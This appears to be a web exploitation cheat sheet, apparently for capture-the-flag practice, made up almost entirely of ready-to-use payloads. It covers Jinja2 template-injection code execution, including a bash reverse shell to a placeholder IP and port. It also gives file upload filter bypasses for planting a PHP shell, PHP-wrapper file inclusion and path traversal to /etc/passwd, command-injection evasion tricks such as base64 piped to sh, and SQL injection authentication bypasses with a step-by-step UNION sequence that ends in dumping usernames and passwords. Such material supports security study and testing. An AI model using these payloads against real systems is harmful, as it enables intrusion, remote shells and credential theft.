# Web Exploitation Payloads

## 1. Server-Side Template Injection (SSTI)

### Identification
Submit test expressions into input fields:
- `{{7*7}}`: Returns `49` (Flask/Jinja2 or Twig).
- `${7*7}`: Returns `49` (Java/Spring, Smarty, or PHP).
- `{{7*'7'}}`: Returns `7777777` in Jinja2; returns `49` in Twig.

### Jinja2 (Flask / Python) Remote Code Execution
Read system files:
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Spawn a reverse shell:
```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"').read() }}
```

Filter bypass when quotes or standard keywords are blocked:
```jinja2
{{ request.application.__globals__.__builtins__.__import__('os').popen(request.args.cmd).read() }}&cmd=cat+/flag*
```

---

## 2. File Upload Bypasses

When `.php` is blocked:

1. Alternative extensions:
   `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`, `.phps`, `.phar`

2. Double extensions and null bytes:
   `shell.php.jpg`, `shell.php%00.jpg`, `shell.php.png`

3. Magic bytes and MIME type spoofing:
   Prepend GIF header bytes to your upload file to bypass file header validation:
   ```text
   GIF89a;
   [Insert PHP command execution code here, e.g. phpinfo() or system command]
   ```
   In Burp Suite, change `Content-Type: application/x-php` to `Content-Type: image/png` or `image/jpeg`.

---

## 3. Local File Inclusion (LFI) and PHP Wrappers

### Read Source Code (Base64 Filter)
```text
http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=config.php
```
Decode the output using:
```bash
echo "<BASE64_STRING>" | base64 -d
```

### Path Traversal Patterns
```text
../../../../etc/passwd
..%2f..%2f..%2f..%2fetc%2fpasswd
....//....//....//etc/passwd
/etc/passwd%00
```

---

## 4. Command Injection Bypasses

### Space Replacement
Use environment variables or file redirection when spaces are blocked:
```bash
cat$IFS/flag.txt
cat${IFS}/flag.txt
cat<$IFS/flag.txt
{cat,/flag.txt}
```

### Keyword Obfuscation
Concatenate empty strings or quotes:
```bash
c''at /fl*
c""at /fl?g
c\at /f'l'ag.txt
```

Execute base64-encoded command:
```bash
echo "Y2F0IC9mbGFn" | base64 -d | sh
```

---

## 5. SQL Injection (SQLi)

### Authentication Bypass
```sql
admin'--
<username>'--
admin' #
admin' or 1=1--
' OR 1=1 LIMIT 1--
' OR 1=1 --
```

---

### Complete UNION SQL Injection Sequence (Testing to Execution)

#### Step 1: Determine Column Count
Inject `ORDER BY` and increment the index until the server returns an error (HTTP 500 or missing content):
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```
If `ORDER BY 3` returns 200 OK and `ORDER BY 4` returns 500 Error, the query returns exactly 3 columns.

Alternative method using NULLs:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```
When the number of NULLs matches the table columns, the server returns 200 OK without errors.

#### Step 2: Test Each Column for Text Compatibility
A UNION query requires each column in both queries to have compatible data types. To find which column can display text (such as usernames, passwords, or flags), replace each `NULL` with a test string (such as `'test'`) one by one:

Test Column 1:
```sql
' UNION SELECT 'test', NULL, NULL--
```
If server returns 500 Error, Column 1 does not accept string data.

Test Column 2:
```sql
' UNION SELECT NULL, 'test', NULL--
```
If server returns 200 OK and the word `test` appears in the rendered webpage, Column 2 accepts text and can be used to extract data.

Test Column 3:
```sql
' UNION SELECT NULL, NULL, 'test'--
```

Note: If targeting an Oracle database, every SELECT query requires a `FROM` clause. Use `FROM dual`:
```sql
' UNION SELECT NULL, 'test', NULL FROM dual--
```

#### Step 3: Extract Database Version Through Identified Text Column
Assuming Column 2 accepts text:

- MySQL and Microsoft SQL Server:
  ```sql
  ' UNION SELECT NULL, @@version, NULL--
  ```
- PostgreSQL:
  ```sql
  ' UNION SELECT NULL, version(), NULL--
  ```
- SQLite:
  ```sql
  ' UNION SELECT NULL, sqlite_version(), NULL--
  ```
- Oracle:
  ```sql
  ' UNION SELECT NULL, banner, NULL FROM v$version--
  ```

#### Step 4: Enumerate Tables and Columns

List table names:
- MySQL / PostgreSQL:
  ```sql
  ' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
  ```
- SQLite:
  ```sql
  ' UNION SELECT NULL, tbl_name, NULL FROM sqlite_master WHERE type='table'--
  ```

List column names of target table (e.g. `users`):
- MySQL / PostgreSQL:
  ```sql
  ' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'--
  ```
- SQLite:
  ```sql
  ' UNION SELECT NULL, sql, NULL FROM sqlite_master WHERE type='table' AND name='users'--
  ```

#### Step 5: Dump Credentials and Flags
Concatenate username and password into the single text-compatible column:

- MySQL:
  ```sql
  ' UNION SELECT NULL, concat(username, ':', password), NULL FROM users--
  ```
- PostgreSQL, SQLite, and Oracle:
  ```sql
  ' UNION SELECT NULL, username || ':' || password, NULL FROM users--
  ```
